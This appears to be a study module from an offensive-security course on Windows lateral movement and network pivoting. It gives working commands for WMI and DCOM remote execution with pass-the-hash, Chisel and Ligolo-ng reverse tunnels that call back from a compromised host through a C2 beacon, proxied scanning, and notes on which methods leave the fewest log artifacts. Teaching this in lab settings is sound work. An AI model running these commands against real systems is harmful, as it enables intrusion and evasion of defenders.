# Phase 09: Lateral Movement & Pivoting

> **Why this phase exists**: Getting from one host to another is more than running PsExec. You need to understand what each protocol does, what artifacts it leaves, and how to route traffic through hosts that restrict network access.

**Study time**: 1 week | **Difficulty**: Intermediate

---

## Learning Objectives

- [ ] Explain what WMI is and how `wmiexec` uses it for remote execution
- [ ] Explain why WinRM execution is quieter than PsExec and when to use each
- [ ] Set up a Chisel SOCKS tunnel and route Impacket tools through it
- [ ] Explain what DCOM is and why it's a valid lateral move primitive
- [ ] Choose the right lateral move protocol for a given scenario

---

## 1. Why Lateral Movement Requires Protocol Knowledge

Each lateral movement technique uses a different Windows protocol. Each protocol:
- Requires different ports (and thus network paths)
- Requires different privileges
- Leaves different artifacts in event logs

You need to match protocol to scenario.

### The protocols and when to use each

| Protocol | Port | Privilege needed | Noise | Use when |
|----------|------|-----------------|-------|---------|
| WinRM | 5985 | Local admin | Medium | WinRM enabled, want interactive PS shell |
| WMI | 135 + dyn | Local admin | Low | SMB blocked, need quiet execution |
| SMB/PsExec | 445 | Local admin | High | Fastest path, don't care about noise |
| RDP | 3389 | Local admin | High | Need GUI access |
| DCOM | 135 + dyn | Local admin | Very low | Quiet execution, no service created |

---

## 2. WMI — Why It's Quieter Than PsExec

**What WMI is**: Windows Management Instrumentation is an API for managing Windows systems. Built into every Windows version. Sysadmins use it extensively — so WMI activity looks normal.

**Why PsExec is loud**: PsExec drops a binary to the ADMIN$ share (Event 5145 — file share access, plus a file creation event), creates a service (Event 7045), and starts it (Event 7036). Three distinct artifacts, all on one action.

**Why WMI is quieter**: `Win32_Process.Create` just starts a process. No service created, no binary dropped. Only a process creation event (4688) on the target — same as if the user ran the command locally.

```bash
# Kali → Windows via WMI
wmiexec.py domain/user:password@<target>
wmiexec.py -hashes :NTLMhash domain/user@<target>

# What it's doing:
# Authenticates via NTLM/Kerberos over RPC (port 135)
# Calls Win32_Process.Create("cmd.exe /c <command>")
# Writes output to a temp file
# Reads output via SMB
```

**DCOM** is similar — uses COM activation (also via RPC port 135) to trigger execution. Even less artifact-generating:

```bash
dcomexec.py domain/user:password@<target>
dcomexec.py -object MMC20 domain/user:password@<target>  # uses MMC20.Application COM object
```

---

## 3. Network Pivoting — Why You Need It

### The scenario

Many exam environments (and real networks) have segmentation:
```
[Your Kali] — VPN → [DMZ / User network: 192.168.1.0/24]
                                         ↓
                          [Internal servers: 10.10.10.0/24]
                          (Kali cannot reach directly)
```

You compromise WS01 at 192.168.1.50. WS01 can reach 10.10.10.0/24. But Kali cannot.

Solution: route all your Kali tool traffic through WS01.

### Chisel — The Reliable Pivot Tool

Chisel creates a TCP tunnel over HTTP. A "server" runs on Kali, a "client" runs on the compromised host. The client connects back to the server (no inbound port needed on Kali) and creates a SOCKS5 proxy.

```bash
# === KALI (attacker) ===
# Download chisel
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && chmod +x chisel_linux_amd64
mv chisel_linux_amd64 chisel

# Start chisel server
./chisel server -p 8080 --reverse
# Listening for clients...

# === Compromised host (via C2 shell) ===
# Upload chisel client via C2
sliver (beacon) > upload ~/tools/chisel.exe C:\\Windows\\Temp\\chisel.exe

# Connect back to Kali
sliver (beacon) > shell
> C:\Windows\Temp\chisel.exe client <kali_ip>:8080 R:socks

# === KALI again ===
# chisel shows: session#1: socks enabled
# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Now route tools through the tunnel
proxychains nmap -sT -Pn -p 445,5985,88 10.10.10.10
proxychains evil-winrm -i 10.10.10.10 -u admin -p Password1
proxychains bloodhound-python -u user -p pass -d domain.local -dc 10.10.10.10 -c All
```

**Why Chisel uses reverse connection**: The compromised host likely can't accept inbound connections (firewall rules). The reverse (-R) flag means the *client* connects *out* to the server — outbound HTTP traffic, which is almost always allowed.

### Ligolo-ng (better for complex environments)

Ligolo creates a TUN interface on Kali — no proxychains needed, all tools work natively.

```bash
# Kali: start proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Compromised host: run agent
.\agent.exe -connect <kali_ip>:11601 -ignore-cert

# Kali: in Ligolo interface
>> session                    # select the session
>> ifconfig                   # see target network interfaces
>> start                      # start tunneling

# Add route on Kali (replace with actual subnet)
sudo ip route add 10.10.10.0/24 dev ligolo

# Now use tools directly — no proxychains:
nmap -sT -p 445 10.10.10.10
evil-winrm -i 10.10.10.10 -u admin -p Password1
```

---

## 4. Finding Where to Move

Before lateral movement, answer: **Where can I go, and what makes those hosts valuable?**

```bash
# What hosts are alive?
nxc smb <subnet>/24 -u user -p pass --no-bruteforce 2>/dev/null | grep -v "[-]"

# Where are you local admin?
nxc smb <subnet>/24 -u user -H <NTLMhash> 2>/dev/null | grep "Pwn3d!"

# Who is logged in where? (hunt for DA session)
nxc smb <subnet>/24 -u user -p pass --loggedon-users | grep -i "admin"

# BloodHound: "Find Shortest Paths to Domain Admins from Owned Principals"
# This shows exact lateral move steps needed
```

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [THM: Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting) | THM (Sub) | All lateral move techniques |
| [THM: Pivoting, Tunnelling and Port Forwarding](https://tryhackme.com/room/pivotingTunnellingandPortForwarding) | THM (Sub) | Pivot tools deep dive |
| [HTB: Forest](https://app.hackthebox.com/machines/Forest) | HTB (Free) | Multi-hop AD box |
| Manual: Pivot lab | Your lab | 3 VMs: Kali → WS01 → DC (only WS01 can reach DC) |

---

## Phase 09 Mastery Checklist

- [ ] Can you explain why WMI execution leaves fewer artifacts than PsExec?
- [ ] Can you get a WMI shell on a remote host using wmiexec.py?
- [ ] Can you set up a Chisel SOCKS5 tunnel and route nmap through it?
- [ ] Can you route evil-winrm to a host that's only reachable via a pivot?
- [ ] Can you use BloodHound to identify the lateral move steps to a high-value target?
- [ ] Can you explain when you'd use DCOM vs WinRM vs SMB for lateral movement?

---

## Next Phase → **Phase 10: Active Directory Fundamentals**
